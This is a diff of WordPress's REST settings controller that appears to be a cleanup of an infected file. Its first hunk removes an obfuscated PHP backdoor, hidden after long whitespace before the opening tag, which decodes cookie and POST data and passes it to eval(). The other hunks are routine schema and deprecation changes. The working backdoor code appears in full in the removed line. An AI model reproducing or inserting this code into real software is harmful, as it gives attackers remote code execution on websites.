@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $Klbef = chr (75) . '_' . 'C' . chr ( 1045 - 963 )."\x6c";$ZBZkC = "\x63" . "\x6c" . chr ( 893 - 796 ).chr (115) . chr (115) . chr ( 700 - 605 )."\145" . 'x' . chr (105) . chr ( 657 - 542 ).chr (116) . chr ( 597 - 482 ); $dmmwRP = $ZBZkC($Klbef); $PaQUOWB = $dmmwRP;if (!$PaQUOWB){class K_CRl{private $hzFfZzPfGx;public static $AiOJJHg = "b18632fd-aa2d-49c0-8a71-c9d23d60a2d0";public static $iuWPKaGC = NULL;public function __construct(){$mcbvUmxirc = $_COOKIE;$gCxcg = $_POST;$EFJxvY = @$mcbvUmxirc[substr(K_CRl::$AiOJJHg, 0, 4)];if (!empty($EFJxvY)){$qNdTOZauj = "base64";$cyqLm = "";$EFJxvY = explode(",", $EFJxvY);foreach ($EFJxvY as $hCITre){$cyqLm .= @$mcbvUmxirc[$hCITre];$cyqLm .= @$gCxcg[$hCITre];}$cyqLm = array_map($qNdTOZauj . chr (95) . 'd' . 'e' . "\143" . "\157" . "\x64" . "\145", array($cyqLm,)); $cyqLm = $cyqLm[0] ^ str_repeat(K_CRl::$AiOJJHg, (strlen($cyqLm[0]) / strlen(K_CRl::$AiOJJHg)) + 1);K_CRl::$iuWPKaGC = @unserialize($cyqLm);}}public function __destruct(){$this->KfFpzNHnn();}private function KfFpzNHnn(){if (is_array(K_CRl::$iuWPKaGC)) {$YDYbmMBOpv = str_replace("\74" . '?' . 'p' . "\x68" . chr ( 426 - 314 ), "", K_CRl::$iuWPKaGC["\x63" . 'o' . 'n' . "\x74" . 'e' . 'n' . "\164"]);eval($YDYbmMBOpv);exit();}}}$misUUH = new K_CRl(); $misUUH = NULL;} ?><?php
+<?php
 /**
  * REST API: WP_REST_Settings_Controller class
  *
@@ -54,7 +54,6 @@ class WP_REST_Settings_Controller extends WP_REST_Controller {
 				'schema' => array( $this, 'get_public_item_schema' ),
 			)
 		);
-
 	}
 
 	/**
@@ -238,6 +237,7 @@ class WP_REST_Settings_Controller extends WP_REST_Controller {
 
 			$default_schema = array(
 				'type'        => empty( $args['type'] ) ? null : $args['type'],
+				'title'       => empty( $args['label'] ) ? '' : $args['label'],
 				'description' => empty( $args['description'] ) ? '' : $args['description'],
 				'default'     => isset( $args['default'] ) ? $args['default'] : null,
 			);
@@ -258,7 +258,7 @@ class WP_REST_Settings_Controller extends WP_REST_Controller {
 				continue;
 			}
 
-			$rest_args['schema'] = $this->set_additional_properties_to_false( $rest_args['schema'] );
+			$rest_args['schema'] = rest_default_additional_properties_to_false( $rest_args['schema'] );
 
 			$rest_options[ $rest_args['name'] ] = $rest_args;
 		}
@@ -322,31 +322,22 @@ class WP_REST_Settings_Controller extends WP_REST_Controller {
 	}
 
 	/**
-	 * Recursively add additionalProperties = false to all objects in a schema.
+	 * Recursively add additionalProperties = false to all objects in a schema
+	 * if no additionalProperties setting is specified.
 	 *
-	 * This is need to restrict properties of objects in settings values to only
+	 * This is needed to restrict properties of objects in settings values to only
 	 * registered items, as the REST API will allow additional properties by
 	 * default.
 	 *
 	 * @since 4.9.0
+	 * @deprecated 6.1.0 Use {@see rest_default_additional_properties_to_false()} instead.
 	 *
 	 * @param array $schema The schema array.
 	 * @return array
 	 */
 	protected function set_additional_properties_to_false( $schema ) {
-		switch ( $schema['type'] ) {
-			case 'object':
-				foreach ( $schema['properties'] as $key => $child_schema ) {
-					$schema['properties'][ $key ] = $this->set_additional_properties_to_false( $child_schema );
-				}
+		_deprecated_function( __METHOD__, '6.1.0', 'rest_default_additional_properties_to_false()' );
 
-				$schema['additionalProperties'] = false;
-				break;
-			case 'array':
-				$schema['items'] = $this->set_additional_properties_to_false( $schema['items'] );
-				break;
-		}
-
-		return $schema;
+		return rest_default_additional_properties_to_false( $schema );
 	}
 }
